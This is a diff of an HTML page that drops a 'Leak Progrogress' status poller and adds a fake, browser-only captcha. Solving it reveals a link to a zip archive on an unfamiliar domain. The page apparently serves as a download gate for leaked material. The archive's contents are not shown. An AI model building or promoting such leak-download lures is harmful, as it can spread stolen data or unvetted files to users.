@@ -2,35 +2,184 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Leak Progrogress</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Download</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #f5f5f5;
+        padding: 30px;
+    }
+
+    .captcha {
+        width: 310px;
+        max-width: 100%;
+        box-sizing: border-box;
+        background: white;
+        border: 1px solid #ccc;
+        padding: 15px;
+    }
+
+    .heading {
+        background: #4285f4;
+        color: white;
+        padding: 15px;
+        margin: -15px -15px 15px;
+    }
+
+    .heading small {
+        display: block;
+        margin-bottom: 5px;
+    }
+
+    .grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 4px;
+    }
+
+    .tile {
+        height: 85px;
+        border: 2px solid transparent;
+        background: #eee;
+        font-size: 30px;
+        cursor: pointer;
+    }
+
+    .tile.selected {
+        border: 3px solid #4285f4;
+        background: #dce8ff;
+    }
+
+    .bottom {
+        margin-top: 15px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 8px;
+    }
+
+    #message {
+        font-size: 12px;
+    }
+
+    #verify {
+        background: #4285f4;
+        border: none;
+        color: white;
+        padding: 10px 15px;
+        cursor: pointer;
+    }
+
+    #download {
+        display: none;
+        margin-top: 20px;
+    }
+</style>
 </head>
 <body>
-    <h2>Leak Progrogress:</h2>
-    <pre id="status">Loading...</pre>
 
-    <script>
-        async function checkFile() {
-            const status = document.getElementById("status");
+<h2>Download:</h2>
 
-            try {
-                const response = await fetch(
-                    "https://sonytracker.com/gtcon.txt?t=" + Date.now()
-                );
+<div class="captcha" id="captcha">
+    <div class="heading">
+        <small>Select all squares with</small>
+        <strong>the number 1</strong>
+    </div>
 
-                if (!response.ok) {
-                    throw new Error("Request failed");
+    <div class="grid" id="grid"></div>
+
+    <div class="bottom">
+        <span id="message">Select matching squares</span>
+        <button id="verify" type="button">VERIFY</button>
+    </div>
+</div>
+
+<div id="download">
+    <p>Verification complete!</p>
+    <a href="http://wingman-security.online/drive/sonytracker.com/A7.zip">
+        Click me to download
+    </a>
+</div>
+
+<script>
+(function () {
+    const grid = document.getElementById("grid");
+    const message = document.getElementById("message");
+    const captcha = document.getElementById("captcha");
+    const download = document.getElementById("download");
+    const verifyButton = document.getElementById("verify");
+
+    let correct = new Set();
+    let selected = new Set();
+
+    function shuffle(array) {
+        for (let i = array.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [array[i], array[j]] = [array[j], array[i]];
+        }
+        return array;
+    }
+
+    function newChallenge() {
+        grid.innerHTML = "";
+        selected.clear();
+        correct.clear();
+        download.style.display = "none";
+        captcha.style.display = "block";
+        message.textContent = "Select matching squares";
+
+        // Randomize the digits and the positions of the 1s.
+        const values = shuffle([
+            "1", "1", "1", "1",
+            "2", "3", "4", "5", "6"
+        ]);
+
+        values.forEach((value, index) => {
+            if (value === "1") correct.add(index);
+
+            const tile = document.createElement("button");
+            tile.type = "button";
+            tile.className = "tile";
+            tile.textContent = value;
+            tile.setAttribute("aria-pressed", "false");
+
+            tile.addEventListener("click", function () {
+                if (selected.has(index)) {
+                    selected.delete(index);
+                    tile.classList.remove("selected");
+                    tile.setAttribute("aria-pressed", "false");
+                } else {
+                    selected.add(index);
+                    tile.classList.add("selected");
+                    tile.setAttribute("aria-pressed", "true");
                 }
 
-                status.textContent = await response.text();
-            } catch (error) {
-                status.textContent = "Unable to load status.";
-            }
-        }
+                message.textContent = selected.size + " selected";
+            });
 
-        checkFile();
-        setInterval(checkFile, 30000);
-    </script>
+            grid.appendChild(tile);
+        });
+    }
+
+    verifyButton.addEventListener("click", function () {
+        const passed =
+            selected.size === correct.size &&
+            [...correct].every(index => selected.has(index));
+
+        if (passed) {
+            captcha.style.display = "none";
+            download.style.display = "block";
+        } else {
+            message.textContent = "Try again!";
+            setTimeout(newChallenge, 700);
+        }
+    });
+
+    newChallenge();
+})();
+</script>
+
 </body>
 </html>
